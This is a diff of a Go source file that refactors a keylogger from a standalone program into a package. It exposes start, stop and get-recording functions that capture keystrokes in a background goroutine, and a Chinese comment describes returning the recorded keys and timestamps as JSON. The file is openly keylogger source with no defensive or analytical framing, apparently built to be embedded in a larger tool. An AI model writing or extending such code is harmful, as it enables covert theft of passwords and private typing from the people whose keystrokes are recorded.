@@ -1,4 +1,4 @@
-package main
+package keylogger
 
 import (
 	"fmt"
@@ -10,7 +10,7 @@ const (
 	delayKeyfetchMS = 5
 )
 
-type Keyloggerinfo struct {
+type KeyLoggerInfo struct {
 	Recording     string
 	StartTime     time.Time
 	EndTime       time.Time
@@ -18,13 +18,17 @@ type Keyloggerinfo struct {
 	KeyLoggerOver bool
 }
 
+var loggerInfo KeyLoggerInfo
+
 /**
 返回Json：键盘记录结果，键盘记录开始时间，键盘记录结束时间
 */
-
-func RunKeyLogger(keyloggerinfo *Keyloggerinfo) {
+func init() {
+	loggerInfo.KeyLoggerOver = true
+}
+func RunKeyLogger(keyloggerinfo *KeyLoggerInfo) {
 	newKeyloggerinfo := keyloggerinfo
-	newKeyloggerinfo.StartTime = time.Now()
+
 	kl := keylogger.NewKeylogger()
 	for {
 		key := kl.GetKey()
@@ -39,13 +43,25 @@ func RunKeyLogger(keyloggerinfo *Keyloggerinfo) {
 	}
 	newKeyloggerinfo.EndTime = time.Now()
 }
-func main() {
-
-	kellogg := &Keyloggerinfo{KeyLoggerOver: false}
-	go RunKeyLogger(kellogg)
-	time.Sleep(5000 * time.Millisecond)
-	kellogg.KeyLoggerOver = true
-	print(kellogg.Recording)
-	var input string
-	fmt.Scanln(&input)
+func StartKeyLogger() bool {
+	if loggerInfo.KeyLoggerOver == false {
+		return false
+	}
+	loggerInfo.Recording = ""
+	loggerInfo.KeyLoggerOver = false
+	loggerInfo.KeyLoggerId = 001
+	loggerInfo.StartTime = time.Now()
+	go RunKeyLogger(&loggerInfo)
+	return true
+}
+func EndKeyLogger() bool {
+	if loggerInfo.KeyLoggerOver == true {
+		return false
+	}
+	loggerInfo.KeyLoggerOver = true
+	loggerInfo.EndTime = time.Now()
+	return true
+}
+func GetKeyRecording() string {
+	return loggerInfo.Recording
 }
